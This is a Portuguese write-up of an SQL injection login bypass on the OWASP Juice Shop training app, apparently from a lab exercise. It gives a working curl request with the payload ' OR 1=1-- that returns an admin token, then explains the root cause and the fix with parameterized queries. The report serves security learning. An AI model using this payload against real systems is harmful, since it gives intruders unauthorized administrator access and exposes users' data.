# 01 - Bypass de autenticação via SQL injection no login

## Resumo

O endpoint de login do Juice Shop concatena o campo `email` diretamente na consulta SQL
que valida as credenciais. Um payload com uma aspa simples e um comentário SQL encerra a
string antes do previsto, transforma o dado em comando e descarta a verificação de senha.
O resultado é acesso autenticado à conta de administrador sem conhecer a senha.

- **Endpoint:** `POST /rest/user/login`
- **Parâmetro vulnerável:** `email`
- **Categoria OWASP Top 10 (2021):** A03 Injection
- **Severidade:** Crítica
- **CVSS 3.1:** 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)

## Ambiente

- Alvo: OWASP Juice Shop em `http://localhost:3000` (via `docker compose up -d`)
- Ferramentas: cURL para a prova crua, Burp Suite para interceptação manual

## Passos de reprodução

### Baseline: login honesto com senha incorreta

```bash
curl -s -w "\n>>> HTTP %{http_code}\n" -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"senha-que-eu-nao-sei"}'
```

Resposta esperada:

```
Invalid email or password.
>>> HTTP 401
```

O servidor nega o acesso, como deveria.

### Ataque: payload SQL no campo email

```bash
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"qualquer-coisa"}'
```

O campo `email` recebe o payload `' OR 1=1--`. A resposta retorna HTTP 200 com um token
JWT. O miolo do token, decodificado, revela a identidade concedida:

```
id:    1
email: admin@juice-sh.op
role:  admin
```

A senha enviada foi `qualquer-coisa` e nunca foi verificada.

## Causa raiz

A consulta montada no servidor tem a forma:

```sql
SELECT * FROM Users WHERE email = 'ENTRADA_DO_USUARIO' AND password = '...'
```

Com a entrada `' OR 1=1--`, a consulta efetivamente executada vira:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1-- ' AND password = '...'
```

- A aspa simples encerra a string do email antes do previsto. A partir dali, a entrada do
  usuário deixa de ser tratada como dado e passa a ser interpretada como comando SQL.
- `OR 1=1` é uma condição sempre verdadeira, o que faz a consulta retornar todas as linhas
  da tabela `Users`. O código da aplicação seleciona a primeira, que é o administrador.
- `--` inicia um comentário em SQL, anulando todo o restante da consulta, incluindo a
  checagem `AND password = '...'`. Por isso qualquer senha é aceita.

A raiz é a construção da consulta por concatenação de string com entrada não confiável,
sem separação entre código e dado.

## Impacto

- Acesso completo à conta de administrador sem credencial válida.
- A partir da conta de admin, acesso a dados de todos os usuários, pedidos e áreas
  administrativas da aplicação.
- O mesmo vetor permite extrair dados arbitrários do banco com payloads de injeção mais
  elaborados, caracterizando perda de confidencialidade, integridade e disponibilidade.

## Correção

- **Consultas parametrizadas (prepared statements):** enviar a estrutura da consulta e os
  dados em canais separados, para que o banco sempre trate a entrada como dado, nunca como
  comando. É a defesa primária e suficiente contra esta classe de falha.
- **Camada de acesso a dados com ORM** usando binding de parâmetros, evitando concatenação
  manual de SQL.
- **Validação de entrada** do campo email como defesa em profundidade, rejeitando valores
  que não tenham formato de email. Não substitui a parametrização.

## Referências

- OWASP Top 10 2021 - A03 Injection: https://owasp.org/Top10/A03_2021-Injection/
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Juice Shop: https://owasp.org/www-project-juice-shop/
